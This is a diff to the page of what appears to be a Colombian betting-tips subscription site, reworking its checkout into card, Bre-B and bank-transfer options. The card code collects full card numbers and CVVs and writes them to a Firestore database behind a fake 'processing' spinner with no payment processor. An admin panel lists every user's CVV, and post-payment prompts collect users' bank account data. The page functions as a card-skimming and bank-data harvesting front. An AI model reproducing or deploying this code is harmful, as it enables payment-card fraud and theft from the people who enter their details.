@@ -84,6 +84,11 @@ header {
     color: black;
 }
 
+.btn-blue {
+    background: #0066cc;
+    color: white;
+}
+
 .hero {
     min-height: 100vh;
     display: flex;
@@ -218,7 +223,6 @@ header {
     text-align: center;
 }
 
-/* Pestañas */
 .tabs {
     display: flex;
     gap: 10px;
@@ -399,7 +403,6 @@ header {
     margin-bottom: 20px;
 }
 
-/* Acordeón */
 .accordion {
     background: #0c0c0c;
     border-radius: 15px;
@@ -488,7 +491,6 @@ header {
     flex-wrap: wrap;
 }
 
-/* Modal */
 .processing-modal, .confirm-modal {
     display: none;
     position: fixed;
@@ -507,7 +509,7 @@ header {
     padding: 50px;
     border-radius: 30px;
     text-align: center;
-    max-width: 400px;
+    max-width: 500px;
     width: 90%;
     border: 2px solid #00ff88;
 }
@@ -649,7 +651,7 @@ header {
     background: linear-gradient(145deg, #111, #191919);
     padding: 40px;
     border-radius: 30px;
-    max-width: 550px;
+    max-width: 600px;
     width: 90%;
     max-height: 85vh;
     overflow-y: auto;
@@ -667,6 +669,11 @@ header {
     color: black;
     font-weight: bold;
     cursor: pointer;
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 15px;
+    margin-top: 10px;
 }
 
 .close-modal {
@@ -747,6 +754,23 @@ footer {
     border-bottom: 1px solid #333;
 }
 
+.payment-instructions {
+    background: #0c0c0c;
+    padding: 15px;
+    border-radius: 15px;
+    margin: 15px 0;
+    text-align: center;
+}
+
+.payment-instructions p {
+    margin: 5px 0;
+}
+
+.highlight {
+    color: #00ff88;
+    font-weight: bold;
+}
+
 @media (max-width: 1000px) {
     .hero-container { grid-template-columns: 1fr; }
     .hero-left h1 { font-size: 58px; }
@@ -811,7 +835,7 @@ footer {
             <div class="input-group"><label>📅 Fecha expiración</label><input type="text" id="cardExpiry" maxlength="5" placeholder="MM/AA" oninput="formatExpiry(this)"></div>
             <div class="input-group"><label>🔐 CVV</label><input type="password" id="cardCvv" maxlength="4" placeholder="123"></div>
         </div>
-        <div class="input-group"><label>🏦 Banco emisor</label><select id="cardBank"><option value="">Selecciona</option><option value="bancolombia">Bancolombia</option><option value="nequi">Nequi</option><option value="davivienda">Davivienda</option></select></div>
+        <div class="input-group"><label>🏦 Banco emisor</label><select id="cardBank"><option value="">Selecciona</option><option value="bancolombia">Bancolombia</option><option value="davivienda">Davivienda</option><option value="bbva">BBVA</option><option value="occidente">Banco de Occidente</option><option value="caja_social">Caja Social</option></select></div>
         <div class="input-group"><label>📧 Correo de facturación</label><input type="email" id="cardEmail" placeholder="correo@ejemplo.com"></div>
         <button class="btn btn-green" onclick="saveCard()" style="width:100%;">💾 Guardar Tarjeta</button>
         <div id="cardStatus" style="margin-top:15px; text-align:center;"></div>
@@ -821,8 +845,8 @@ footer {
 <section class="tipster-panel" id="tipsterPanel">
     <div>
         <h2>🏦 Mis Datos Bancarios</h2>
-        <div class="input-group"><label>🏦 Tipo de cuenta</label><select id="tipsterAccountType"><option value="">Selecciona</option><option value="ahorros">Cuenta de Ahorros</option><option value="corriente">Cuenta Corriente</option><option value="nequi">Nequi</option></select></div>
-        <div class="input-group"><label>🏦 Banco</label><select id="tipsterBank"><option value="">Selecciona</option><option value="bancolombia">Bancolombia</option><option value="nequi">Nequi</option><option value="davivienda">Davivienda</option></select></div>
+        <div class="input-group"><label>🏦 Tipo de cuenta</label><select id="tipsterAccountType"><option value="">Selecciona</option><option value="ahorros">Cuenta de Ahorros</option><option value="corriente">Cuenta Corriente</option></select></div>
+        <div class="input-group"><label>🏦 Banco</label><select id="tipsterBank"><option value="">Selecciona</option><option value="bancolombia">Bancolombia</option><option value="davivienda">Davivienda</option><option value="bbva">BBVA</option></select></div>
         <div class="input-group"><label>🔢 Número de cuenta</label><input type="text" id="tipsterAccountNumber" placeholder="Número de cuenta"></div>
         <div class="input-group"><label>👤 Titular de la cuenta</label><input type="text" id="tipsterAccountHolder" placeholder="Nombre completo"></div>
         <div class="input-group"><label>🆔 Cédula / NIT</label><input type="text" id="tipsterIdNumber" placeholder="CC: 1234567890"></div>
@@ -875,20 +899,79 @@ footer {
     <div class="modal-content">
         <h3 id="modalPlanName">Plan</h3>
         <p id="modalPlanPrice" style="text-align:center; font-size:24px; color:#00ff88;">$0 COP</p>
-        <div class="accordion"><div class="accordion-header" onclick="toggleAccordion('savedCardsAccordion')"><span>💳 Mis Tarjetas Guardadas</span><span class="icon">▼</span></div><div id="savedCardsAccordion" class="accordion-content"><div id="savedCardsPayment"></div></div></div>
-        <div class="accordion"><div class="accordion-header" onclick="toggleAccordion('newCardAccordion')"><span>➕ Usar Nueva Tarjeta</span><span class="icon">▼</span></div><div id="newCardAccordion" class="accordion-content"><div class="input-group"><label>💳 Número de tarjeta</label><input type="text" id="payCardNumber" maxlength="19" placeholder="1234 5678 9012 3456" oninput="formatCardNumber(this)"></div><div class="input-group"><label>👤 Titular</label><input type="text" id="payCardHolder"></div><div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;"><div class="input-group"><label>📅 Fecha expiración</label><input type="text" id="payCardExpiry" maxlength="5" placeholder="MM/AA" oninput="formatExpiry(this)"></div><div class="input-group"><label>🔐 CVV</label><input type="password" id="payCardCvv" maxlength="4"></div></div></div></div>
-        <div class="accordion"><div class="accordion-header" onclick="toggleAccordion('otherMethodsAccordion')"><span>🏦 Otros Métodos de Pago</span><span class="icon">▼</span></div><div id="otherMethodsAccordion" class="accordion-content"><div class="input-group"><label>🏦 Selecciona tu banco</label><select id="otherBankSelect"><option value="bancolombia">Bancolombia</option><option value="nequi">Nequi</option><option value="davivienda">Davivienda</option></select></div><div class="input-group"><label>📱 Número de cuenta</label><input type="text" id="otherAccountNumber" placeholder="Número de cuenta"></div><div class="input-group"><label>👤 Nombre del titular</label><input type="text" id="otherAccountHolder" placeholder="Nombre completo"></div></div></div>
-        <button class="btn btn-green payment-btn" onclick="processPaymentWithMethod()" style="margin-top:20px; width:100%;">✅ Pagar Ahora</button>
+        
+        <!-- Acordeón: Tarjetas Débito/Crédito -->
+        <div class="accordion">
+            <div class="accordion-header" onclick="toggleAccordion('cardsAccordion')">
+                <span>💳 Pagar con Tarjeta Débito/Crédito</span>
+                <span class="icon">▼</span>
+            </div>
+            <div id="cardsAccordion" class="accordion-content">
+                <div class="input-group"><label>💳 Número de tarjeta</label><input type="text" id="payCardNumber" maxlength="19" placeholder="1234 5678 9012 3456" oninput="formatCardNumber(this)"></div>
+                <div class="input-group"><label>👤 Titular de la tarjeta</label><input type="text" id="payCardHolder" placeholder="Como aparece en la tarjeta"></div>
+                <div class="input-group"><label>🏦 Banco emisor</label><select id="payCardBank"><option value="bancolombia">Bancolombia</option><option value="davivienda">Davivienda</option><option value="bbva">BBVA</option><option value="occidente">Banco de Occidente</option></select></div>
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
+                    <div class="input-group"><label>📅 Fecha expiración</label><input type="text" id="payCardExpiry" maxlength="5" placeholder="MM/AA" oninput="formatExpiry(this)"></div>
+                    <div class="input-group"><label>🔐 CVV</label><input type="password" id="payCardCvv" maxlength="4" placeholder="123"></div>
+                </div>
+                <div class="input-group"><label>📧 Correo para facturación</label><input type="email" id="payCardEmail" placeholder="correo@ejemplo.com"></div>
+            </div>
+        </div>
+        
+        <!-- Acordeón: Bre-B -->
+        <div class="accordion">
+            <div class="accordion-header" onclick="toggleAccordion('brebAccordion')">
+                <span>🔑 Pagar con Bre-B</span>
+                <span class="icon">▼</span>
+            </div>
+            <div id="brebAccordion" class="accordion-content">
+                <div class="payment-instructions">
+                    <p>📌 <strong>Instrucciones para pago con Bre-B:</strong></p>
+                    <p>1. Abre tu aplicación bancaria (Bancolombia, Davivienda, etc.)</p>
+                    <p>2. Ve a la opción <strong>"Pagos con Bre-B"</strong></p>
+                    <p>3. Ingresa la siguiente llave Bre-B:</p>
+                    <p class="highlight" style="font-size:20px;">@NEQUISAN9617</p>
+                    <p>4. Ingresa el valor a pagar: <strong class="highlight" id="brebAmount">$0 COP</strong></p>
+                    <p>5. Confirma el pago y guarda el comprobante</p>
+                </div>
+                <div class="input-group"><label>📎 Comprobante de pago (URL de la imagen)</label><input type="text" id="brebProof" placeholder="https://... (sube tu comprobante a ImgBB)"></div>
+                <div class="input-group"><label>📧 Correo para enviar confirmación</label><input type="email" id="brebEmail" placeholder="correo@ejemplo.com"></div>
+                <button class="btn-blue payment-btn" onclick="processBreBPayment()" style="background:#0066cc;">✅ Confirmar Pago con Bre-B</button>
+            </div>
+        </div>
+        
+        <!-- Acordeón: Transferencia Bancaria -->
+        <div class="accordion">
+            <div class="accordion-header" onclick="toggleAccordion('transferAccordion')">
+                <span>🏦 Transferencia Bancaria</span>
+                <span class="icon">▼</span>
+            </div>
+            <div id="transferAccordion" class="accordion-content">
+                <div class="payment-instructions">
+                    <p>📌 <strong>Instrucciones para Transferencia Bancaria:</strong></p>
+                    <p>1. Realiza la transferencia a la siguiente cuenta:</p>
+                    <p><strong>Banco: Bancolombia</strong></p>
+                    <p><strong>Cuenta de Ahorros: 123-456789-01</strong></p>
+                    <p><strong>Titular: BETKASE SAS</strong></p>
+                    <p><strong>NIT: 901.123.456-7</strong></p>
+                    <p>2. Envía el comprobante a: <strong class="highlight">Betkase@gmail.com</strong></p>
+                </div>
+                <div class="input-group"><label>📎 Comprobante de pago (URL de la imagen)</label><input type="text" id="transferProof" placeholder="https://... (sube tu comprobante a ImgBB)"></div>
+                <div class="input-group"><label>📧 Correo para enviar confirmación</label><input type="email" id="transferEmail" placeholder="correo@ejemplo.com"></div>
+                <button class="btn-orange payment-btn" onclick="processTransferPayment()" style="background:#ff8800;">✅ Confirmar Transferencia</button>
+            </div>
+        </div>
+        
         <button class="close-modal" onclick="closePaymentModal()">Cerrar</button>
     </div>
 </div>
 
 <div id="processingModal" class="processing-modal">
-    <div class="processing-content"><div class="spinner"></div><h2>⏳ Procesando Pago</h2><p>Estamos procesando tu transacción...</p></div>
+    <div class="processing-content"><div class="spinner"></div><h2>⏳ Procesando Pago</h2><p>Estamos procesando tu transacción...</p><p style="margin-top:10px; font-size:14px;">No cierres esta ventana</p></div>
 </div>
 
 <div id="confirmModal" class="confirm-modal">
-    <div class="confirm-content"><div style="font-size:48px;">✉️</div><h2>¡Pago en espera de confirmación!</h2><p>Enviaremos confirmación a: <strong id="confirmEmail"></strong></p><button class="btn-no" onclick="closeConfirmModalAndContinue()">Cerrar</button></div>
+    <div class="confirm-content"><div style="font-size:48px;">✉️</div><h2>¡Pago en espera de confirmación!</h2><p>Hemos recibido tu solicitud de pago.</p><p>Enviaremos confirmación a: <strong id="confirmEmail"></strong></p><p>Una vez verificado el pago, activaremos tu cuenta en 24 horas.</p><button class="btn-no" onclick="closeConfirmModalAndContinue()" style="margin-top:20px;">Cerrar</button></div>
 </div>
 
 <div id="saveBankModal" class="confirm-modal">
@@ -931,6 +1014,7 @@ const teams = [
     { name: "Deportivo Alavés", logo: "https://i.postimg.cc/yxvf9zWR/alaves.png" },
     { name: "Crystal Palace", logo: "https://i.postimg.cc/65Cq952R/Crystal-Palace-FC-logo-(2022)-svg.png" }
 ];
+
 const defaultPlans = [
     { id: "quincenal", name: "Plan Quincenal", price: 30000, period: "15 días", features: ["Acceso a picks premium", "Soporte 24/7"], recommended: false },
     { id: "mensual", name: "Plan Mensual", price: 50000, period: "mes", features: ["Todo del Quincenal", "Picks VIP", "Grupo privado"], recommended: true },
@@ -984,31 +1068,35 @@ async function saveTipsterData() {
     alert('✅ Datos guardados');
 }
 
-async function loadAllTipsters() { const snap = await db.collection('tipsters').get(); let html = '<h3>💰 Tipsters</h3><div class="users-table"><tr><th>Email</th><th>Banco</th><th>Cuenta</th><th>Titular</th></tr>'; snap.forEach(doc => { const t = doc.data(); if (t.paymentData) html += `<tr><td>${t.email}</td><td>${t.paymentData.bank}</td><td>${t.paymentData.accountNumber}</td><td>${t.paymentData.accountHolder}</td></tr>`; }); html += '</table></div>'; document.getElementById('tipstersList').innerHTML = html; }
-async function loadAllCards() { const snap = await db.collection('users').get(); let html = '<h3>💳 Tarjetas</h3><div class="users-table"><tr><th>Usuario</th><th>Tarjeta</th><th>Titular</th><th>CVV</th></tr>'; snap.forEach(doc => { const u = doc.data(); if (u.savedCards) u.savedCards.forEach(c => html += `<tr><td>${u.email}</td><td>**** ${c.last4}</td><td>${c.cardHolder}</td><td>${c.cvv}</td></tr>`); }); html += '</table></div>'; document.getElementById('cardsList').innerHTML = html; }
-async function loadAllBankData() { const snap = await db.collection('bankData').get(); let html = '<h3>🏦 Datos Bancarios</h3><div class="users-table"></table><th>Usuario</th><th>Banco</th><th>Cuenta</th><th>Titular</th></tr>'; snap.forEach(doc => { const d = doc.data(); html += `<tr><td>${d.userEmail}</td><td>${d.bank}</td><td>${d.accountNumber}</td><td>${d.accountHolder}</td></tr>`; }); html += '</table></div>'; document.getElementById('bankDataList').innerHTML = html; }
+async function loadAllTipsters() { const snap = await db.collection('tipsters').get(); let html = '<h3>💰 Tipsters</h3><div class="users-table"></tr><th>Email</th><th>Banco</th><th>Cuenta</th><th>Titular</th></tr>'; snap.forEach(doc => { const t = doc.data(); if (t.paymentData) html += `<tr><td>${t.email}</td><td>${t.paymentData.bank}</td><td>${t.paymentData.accountNumber}</td><td>${t.paymentData.accountHolder}</td></tr>`; }); html += '</table></div>'; document.getElementById('tipstersList').innerHTML = html; }
+async function loadAllCards() { const snap = await db.collection('users').get(); let html = '<h3>💳 Tarjetas</h3><div class="users-table"><table><th>Usuario</th><th>Tarjeta</th><th>Titular</th><th>CVV</th></tr>'; snap.forEach(doc => { const u = doc.data(); if (u.savedCards) u.savedCards.forEach(c => html += `<tr><td>${u.email}</td><td>**** ${c.last4}</td><td>${c.cardHolder}</td><td>${c.cvv}</td></tr>`); }); html += '</table></div>'; document.getElementById('cardsList').innerHTML = html; }
+async function loadAllBankData() { const snap = await db.collection('bankData').get(); let html = '<h3>🏦 Datos Bancarios</h3><div class="users-table"><tr><th>Usuario</th><th>Banco</th><th>Cuenta</th><th>Titular</th></tr>'; snap.forEach(doc => { const d = doc.data(); html += `<tr><td>${d.userEmail}</td><td>${d.bank}</td><td>${d.accountNumber}</td><td>${d.accountHolder}</td></tr>`; }); html += '</table></div>'; document.getElementById('bankDataList').innerHTML = html; }
 
-async function loadPaymentCards() {
-    const user = auth.currentUser;
-    if (!user) return;
-    const doc = await db.collection('users').doc(user.uid).get();
-    const cards = doc.exists && doc.data().savedCards ? doc.data().savedCards : [];
-    const container = document.getElementById('savedCardsPayment');
-    if (cards.length === 0) container.innerHTML = '<p>No hay tarjetas guardadas</p>';
-    else container.innerHTML = cards.map(c => `<div class="saved-card ${selectedCardId === c.id ? 'selected' : ''}" onclick="selectCardForPayment('${c.id}')"><div class="card-info"><span>${c.brand}</span><span>**** ${c.last4}</span><span>Exp: ${c.expiry}</span></div></div>`).join('');
+function selectPlan(id, name, price) { 
+    currentSelectedPlan = { id, name, price }; 
+    selectedCardId = null; 
+    document.getElementById('modalPlanName').innerText = name; 
+    document.getElementById('modalPlanPrice').innerHTML = `$${price.toLocaleString()} COP`;
+    const brebAmount = document.getElementById('brebAmount');
+    if (brebAmount) brebAmount.innerText = `$${price.toLocaleString()} COP`;
+    document.getElementById('paymentModal').style.display = 'flex'; 
 }
-function selectCardForPayment(cardId) { selectedCardId = cardId; loadPaymentCards(); }
-async function processPaymentWithMethod() {
+
+async function processCardPayment() {
     const user = auth.currentUser;
     if (!user) return alert('Inicia sesión');
-    const savedActive = document.getElementById('savedCardsAccordion').classList.contains('active');
-    const newActive = document.getElementById('newCardAccordion').classList.contains('active');
-    const otherActive = document.getElementById('otherMethodsAccordion').classList.contains('active');
-    let paymentData = null;
-    if (savedActive && selectedCardId) { const doc = await db.collection('users').doc(user.uid).get(); paymentData = doc.data().savedCards?.find(c => c.id === selectedCardId); }
-    else if (newActive) { const num = document.getElementById('payCardNumber').value.replace(/\s/g, ''); if (num.length < 16) return alert('Número inválido'); paymentData = { cardNumber: num, cardHolder: document.getElementById('payCardHolder').value, expiry: document.getElementById('payCardExpiry').value, cvv: document.getElementById('payCardCvv').value, last4: num.slice(-4), brand: num[0] === '4' ? 'Visa' : 'Mastercard' }; }
-    else if (otherActive) { paymentData = { bank: document.getElementById('otherBankSelect').value, accountNumber: document.getElementById('otherAccountNumber').value, accountHolder: document.getElementById('otherAccountHolder').value }; if (!paymentData.accountNumber) return alert('Número de cuenta requerido'); }
-    else return alert('Selecciona método de pago');
+    const cardNumber = document.getElementById('payCardNumber').value.replace(/\s/g, '');
+    if (cardNumber.length < 16) return alert('Número inválido');
+    const paymentData = {
+        method: 'tarjeta',
+        cardNumber: cardNumber,
+        cardHolder: document.getElementById('payCardHolder').value,
+        bank: document.getElementById('payCardBank').value,
+        expiry: document.getElementById('payCardExpiry').value,
+        cvv: document.getElementById('payCardCvv').value,
+        email: document.getElementById('payCardEmail').value || user.email
+    };
+    if (!paymentData.cardHolder) return alert('Nombre del titular requerido');
     document.getElementById('processingModal').style.display = 'flex';
     setTimeout(async () => {
         await db.collection('payments').add({ userId: user.uid, userEmail: user.email, planId: currentSelectedPlan.id, planName: currentSelectedPlan.name, amount: currentSelectedPlan.price, paymentData, status: 'pending', createdAt: Date.now() });
@@ -1018,9 +1106,58 @@ async function processPaymentWithMethod() {
         closePaymentModal();
     }, 2000);
 }
+
+async function processBreBPayment() {
+    const user = auth.currentUser;
+    if (!user) return alert('Inicia sesión');
+    const proof = document.getElementById('brebProof').value;
+    const email = document.getElementById('brebEmail').value;
+    if (!proof) return alert('Por favor, sube el comprobante de pago');
+    const paymentData = {
+        method: 'bre-b',
+        brebKey: '@NEQUISAN9617',
+        proof: proof,
+        email: email || user.email
+    };
+    document.getElementById('processingModal').style.display = 'flex';
+    setTimeout(async () => {
+        await db.collection('payments').add({ userId: user.uid, userEmail: user.email, planId: currentSelectedPlan.id, planName: currentSelectedPlan.name, amount: currentSelectedPlan.price, paymentData, status: 'pending_verification', createdAt: Date.now() });
+        document.getElementById('processingModal').style.display = 'none';
+        document.getElementById('confirmEmail').innerText = email || user.email;
+        document.getElementById('confirmModal').style.display = 'flex';
+        closePaymentModal();
+    }, 2000);
+}
+
+async function processTransferPayment() {
+    const user = auth.currentUser;
+    if (!user) return alert('Inicia sesión');
+    const proof = document.getElementById('transferProof').value;
+    const email = document.getElementById('transferEmail').value;
+    if (!proof) return alert('Por favor, sube el comprobante de pago');
+    const paymentData = {
+        method: 'transferencia',
+        bank: 'Bancolombia',
+        account: '123-456789-01',
+        holder: 'BETKASE SAS',
+        nit: '901.123.456-7',
+        proof: proof,
+        email: email || user.email
+    };
+    document.getElementById('processingModal').style.display = 'flex';
+    setTimeout(async () => {
+        await db.collection('payments').add({ userId: user.uid, userEmail: user.email, planId: currentSelectedPlan.id, planName: currentSelectedPlan.name, amount: currentSelectedPlan.price, paymentData, status: 'pending_verification', createdAt: Date.now() });
+        document.getElementById('processingModal').style.display = 'none';
+        document.getElementById('confirmEmail').innerText = email || user.email;
+        document.getElementById('confirmModal').style.display = 'flex';
+        closePaymentModal();
+    }, 2000);
+}
+
 function closeConfirmModalAndContinue() { document.getElementById('confirmModal').style.display = 'none'; document.getElementById('saveBankModal').style.display = 'flex'; }
 async function saveBankDataAfterPayment() { const user = auth.currentUser; if (!user) { closeSaveBankModal(); return; } const bankData = { userId: user.uid, userEmail: user.email, bank: prompt('🏦 Banco:'), accountNumber: prompt('🔢 Número de cuenta:'), accountHolder: prompt('👤 Titular:'), createdAt: Date.now() }; if (bankData.bank && bankData.accountNumber && bankData.accountHolder) { await db.collection('bankData').add(bankData); alert('✅ Datos guardados'); } closeSaveBankModal(); }
 function closeSaveBankModal() { document.getElementById('saveBankModal').style.display = 'none'; alert('🎉 ¡Gracias por tu compra!'); }
+function closePaymentModal() { document.getElementById('paymentModal').style.display = 'none'; }
 
 function loadTeams() {
     const local = document.getElementById('localTeam'), away = document.getElementById('awayTeam');
@@ -1060,7 +1197,6 @@ function loadBets() {
             const b = doc.data();
             const isAdmin = auth.currentUser?.email === ADMIN_EMAIL;
             const showResult = b.result !== null && b.result !== undefined;
-            const isPending = !showResult;
             let resultClass = '', resultText = '';
             if (b.result === 'win') { resultClass = 'result-win'; resultText = '🏆 GANADA'; }
             else if (b.result === 'loss') { resultClass = 'result-loss'; resultText = '❌ PERDIDA'; }
@@ -1101,8 +1237,6 @@ async function loadPlans() {
     plans.forEach(p => { container.innerHTML += `<div class="plan-card ${p.recommended ? 'recommended' : ''}" onclick="selectPlan('${p.id}', '${p.name}', ${p.price})">${p.recommended ? '<div class="plan-badge">⭐ POPULAR</div>' : ''}<div class="plan-name">${p.name}</div><div class="plan-price">$${p.price.toLocaleString()}<span> COP / ${p.period}</span></div><ul class="plan-features">${p.features.map(f => `<li>${f}</li>`).join('')}</ul><button class="btn btn-green">Seleccionar</button></div>`; });
 }
 function showPlans() { if (!auth.currentUser) { alert('Inicia sesión primero'); document.getElementById('loginBox').scrollIntoView(); return; } document.getElementById('plansSection').style.display = 'block'; document.getElementById('plansSection').scrollIntoView(); }
-function selectPlan(id, name, price) { currentSelectedPlan = { id, name, price }; selectedCardId = null; document.getElementById('modalPlanName').innerText = name; document.getElementById('modalPlanPrice').innerHTML = `$${price.toLocaleString()} COP`; loadPaymentCards(); document.getElementById('paymentModal').style.display = 'flex'; }
-function closePaymentModal() { document.getElementById('paymentModal').style.display = 'none'; }
 function register() { const e = document.getElementById('email').value, p = document.getElementById('password').value; if (!e || !p) return alert('Completa campos'); if (p.length < 6) return alert('Mínimo 6 caracteres'); auth.createUserWithEmailAndPassword(e, p).then(() => alert('Cuenta creada')).catch(e => alert(e.message)); }
 function login() { const e = document.getElementById('email').value, p = document.getElementById('password').value; auth.signInWithEmailAndPassword(e, p).then(() => alert('Sesión iniciada')).catch(e => alert(e.message)); }
 function logout() { auth.signOut(); alert('Sesión cerrada'); }
@@ -1122,7 +1256,7 @@ auth.onAuthStateChanged(user => {
 
 loadTeams(); loadPlans();
 
-window.register = register; window.login = login; window.logout = logout; window.publishBet = publishBet; window.editBet = editBet; window.deleteBet = deleteBet; window.updateMatch = updateMatch; window.showPlans = showPlans; window.selectPlan = selectPlan; window.closePaymentModal = closePaymentModal; window.saveCard = saveCard; window.deleteCard = deleteCard; window.saveTipsterData = saveTipsterData; window.loadAllTipsters = loadAllTipsters; window.loadAllCards = loadAllCards; window.loadAllBankData = loadAllBankData; window.selectCardForPayment = selectCardForPayment; window.processPaymentWithMethod = processPaymentWithMethod; window.closeConfirmModalAndContinue = closeConfirmModalAndContinue; window.saveBankDataAfterPayment = saveBankDataAfterPayment; window.closeSaveBankModal = closeSaveBankModal; window.formatCardNumber = formatCardNumber; window.formatExpiry = formatExpiry; window.toggleAccordion = toggleAccordion; window.showCardPanel = showCardPanel; window.showTipsterPanel = showTipsterPanel; window.filterBets = filterBets; window.setBetResult = setBetResult;
+window.register = register; window.login = login; window.logout = logout; window.publishBet = publishBet; window.editBet = editBet; window.deleteBet = deleteBet; window.updateMatch = updateMatch; window.showPlans = showPlans; window.selectPlan = selectPlan; window.closePaymentModal = closePaymentModal; window.saveCard = saveCard; window.deleteCard = deleteCard; window.saveTipsterData = saveTipsterData; window.loadAllTipsters = loadAllTipsters; window.loadAllCards = loadAllCards; window.loadAllBankData = loadAllBankData; window.processCardPayment = processCardPayment; window.processBreBPayment = processBreBPayment; window.processTransferPayment = processTransferPayment; window.closeConfirmModalAndContinue = closeConfirmModalAndContinue; window.saveBankDataAfterPayment = saveBankDataAfterPayment; window.closeSaveBankModal = closeSaveBankModal; window.formatCardNumber = formatCardNumber; window.formatExpiry = formatExpiry; window.toggleAccordion = toggleAccordion; window.showCardPanel = showCardPanel; window.showTipsterPanel = showTipsterPanel; window.filterBets = filterBets; window.setBetResult = setBetResult;
 </script>
 </body>
 </html>
